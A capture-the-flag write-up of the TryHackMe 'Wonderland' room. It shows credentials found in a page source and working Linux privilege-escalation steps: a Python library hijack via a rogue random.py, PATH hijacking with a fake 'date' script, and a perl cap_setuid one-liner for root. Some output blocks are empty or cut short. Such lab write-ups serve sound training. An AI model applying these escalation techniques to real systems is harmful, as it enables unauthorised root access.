# THM Writeup: Wonderland

Hello! Today, let's solve TryHackMe's challenge [Wonderland](https://tryhackme.com/room/wonderland). This was a pretty fun room and I learned a lot. So, let's dive in!

## Enumeration <a href="#enumeration" id="enumeration"></a>

As always, I start the process with Enumeration and first thing I do while enumerating is run an nmap scan. (_You might notice different IP addresses for the machine, it's because I forgot to expand the time and my machine expired midway -\_-)_

```bash
┌──(kali㉿kali)-[~]

Port 80 is open and the title is "Follow the white rabbit." As the room's theme is Alice in Wonderland, this makes sense. Let's visit the page and see what's happening here.

The webpage has a quote from Alice in Wonderland, and a picture of the rabbit. Next, I ran a Gobuster scan and found another directory `/r`.

```bash

Let's go to the new directory and see if there's anything useful.

<figure><img src="../../.gitbook/assets/2.png" alt=""><figcaption></figcaption></figure>

Again, a quote from the book. I noticed something interesting here. The heading says "Keep Going" might it mean that there are more sub-directories here? I ran another Gobuster scan and I found another directory! This time it's `/a`. Here too we find a quote and the title still says "Keep Going". Now, just a wild guess but I thought the directories `/r` and `/a` might mean it's trying to spell the word rabbit. So, I put `/r/a/b/b/i/t` and et voila!

## Initial Foothold & User Shell <a href="#initial-foothold-and-user-shell" id="initial-foothold-and-user-shell"></a>

Now, the title changes to "Open the door and enter wonderland". This might mean something. I check the page source and sure enough, we have the credentials for the user alice!

<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>

I try to SSH with these credentials and we have a shell as alice. \[Hacker Voice] I'm in.

```bash
┌──(kali㉿kali)-[~/thm/wonderland]

alice@wonderland:~$ 
```

I see there's a `root.txt` file in alice's home directory instead of a `user.txt` file. THM's machine page hints that "Everything is upside down here." So, I retrieve the `user.txt` file from the root folder with `cat /root/user.txt`.

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Now, I run `sudo -l` and see that alice can run the `/usr/bin/python3.6 /home/alice /walrus_and_the_carpenter.py` command as the user rabbit. We have to escalate privileges to the user rabbit somehow. We cannot edit the file `walrus_and_the_carpenter.py` but I can atleast look at what the code is doing.

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

...SNIP...

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

The script is reading this poem and printing some random lines from it. What's interesting here is that the script imports the `random` library. Right now, python is interpreting random as the python library. But, if we create a `random.py`, the code will import that and it might give us an elevated shell. This is known as python library hijacking.

{% embed url="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8" %}

Let's create a `random.py` file in alice's home directory.

```python
import os
import pty

pty.spawn("/bin/bash")
```

Now, let's run the command as user rabbit and bingo! This gives us an elevated shell as user rabbit.

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```

Now, rabbit's home directory has only one file, the binary executable `teaParty`. I transfer this on my host machine and execute it.

```bash
┌──(kali㉿kali)-[~/thm/wonderland]
└─$ ./teaParty       
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 12 Jan 2024 10:49:02 -0500
Ask very nicely, and I will give you some tea while you wait for him
```

So, this tells me that "Mad Hatter" will be here soon. Judging from the `/etc/passwd` file there is a user named `hatter`. I also examine the contents of `teaParty` and see that date variable can be hijacked. This can give us an elevated shell as `hatter`.

```bash
┌──(kali㉿kali)-[~/thm/wonderland]
└─$ strings teaParty      
/lib64/ld-linux-x86-64.so.2

Segmentation fault (core dumped)

...SNIP...
```

First, I will set the `PATH` to `/tmp` directory so whenever the binary file will look for the `PATH` it will first check the `/tmp` folder.

```bash
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

Now, we will create a date file in `/tmp` directory with the following contents and make it executable with `chmod +x date`.

{% code title="" %}
```bash
#!/bin/bash
/bin/bash
```
{% endcode %}

This is known as path hijacking. What our binary file is doing is setting the arrival of `hatter` as the `date`. Now, with the `PATH` variable set, the file will look for `date` under `/tmp` directory and when it finds the shell script, it will execute the command and give us an elevated shell as `hatter`.

{% embed url="https://vk9-sec.com/privilege-escalation-linux-path-hijacking/" %}

Now, let's execute the binary.

```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

Et voila! We have the shell as `hatter`. Under hatter's home directory there is a single file called `password.txt` which just stores the password in cleartext. I am guessing this is hatter's password like we had alice's password. SSH-ing to hatter with this password gives me full shell.

Now, I run the usual `linpeas.sh` and find that `perl` executable has a capability which can help me escalated privileges.

```bash
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Check out the following resources to learn more about linux capabilities.

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities" %}

With the help of above resource, I find a one-liner perl code to gain root privileges. I execute and bingo! The TryHackMe room Wonderland is solved!

```bash
hatter@wonderland:/tmp$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:/tmp# whoami
root
root@wonderland:/tmp#
```

Find the root flag under `/home/alice/root.txt`. I learned a lot about path hijacking and linux capabilties with this room. Thank you for reading and I will see you in the next writeup. Adios!
